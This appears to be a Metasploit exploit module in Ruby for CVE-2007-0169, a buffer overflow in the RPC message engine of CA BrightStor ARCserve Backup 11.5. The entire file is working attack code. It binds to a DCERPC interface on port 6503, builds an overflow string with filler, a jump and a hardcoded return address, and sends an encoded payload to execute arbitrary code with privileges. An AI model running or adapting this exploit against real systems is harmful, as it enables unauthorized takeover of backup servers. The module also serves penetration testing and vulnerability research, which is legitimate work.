require 'msf/core'

module Msf

class Exploits::Windows::Brightstor::Messege_Engine < Msf::Exploit::Remote

	include Exploit::Remote::DCERPC

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'CA BrightStor ARCserve Messege Engine Buffer Overflow',
			'Description'    => %q{
				This module exploits a buffer overflow in Computer Associates BrightStor ARCserve Backup
				11.5. By sending a specially crafted RPC request, an attacker could overflow the
				buffer and execute arbitrary code. 
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 3906 $',
			'References'     =>
				[
					[ 'CVE', '2007-0169' ],
					[ 'BID', '22005' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 600,
					'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'  =>
					[
						[ 'BrightStor ARCserve r11.5', { 'Ret' => 0x2380ceb5 } ],
					],	
			'DisclosureDate' => 'Jan 11 2007',
			'DefaultTarget' => 0))

			register_options([ Opt::RPORT(6503) ], self.class)	
	end

	def exploit
		connect
		
		handle = dcerpc_handle('dc246bf0-7a7a-11ce-9f88-00805fe43838', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])	
		print_status("Binding to #{handle} ...")

		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		filler =  rand_text_english(616) + "\xeb\x06" + rand_text_english(2) + [target.ret].pack('V')

		sploit =  NDR.string(filler + payload.encoded + "\x00") + NDR.long(0) 

		print_status("Trying target #{target.name}...")
         
			begin
				dcerpc_call(47, sploit)
				rescue Rex::Proto::DCERPC::Exceptions::NoResponse
			end

		handler
		disconnect
	end

end
end	
